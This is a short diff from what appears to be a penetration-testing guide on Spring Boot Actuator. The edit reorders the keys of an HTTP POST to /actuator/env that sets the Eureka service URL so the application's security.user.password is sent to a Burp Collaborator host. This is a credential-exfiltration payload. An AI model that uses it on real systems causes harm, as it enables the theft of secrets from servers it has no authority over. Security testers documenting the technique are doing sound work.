@@ -256,7 +256,7 @@ POST /actuator/env HTTP/1.1
 Host: {{ target-domain vulnerable.net }}
 Content-Type: application/json
 
-{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${{{ attribute security.user.password }}}@{{ collaborator your.burpcollaborator.net }}"}
+{"value":"http://value:${{{ attribute security.user.password }}}@{{ collaborator your.burpcollaborator.net }}", "name":"eureka.client.serviceUrl.defaultZone"}
 ```
 
 4. Refresh the configuration:
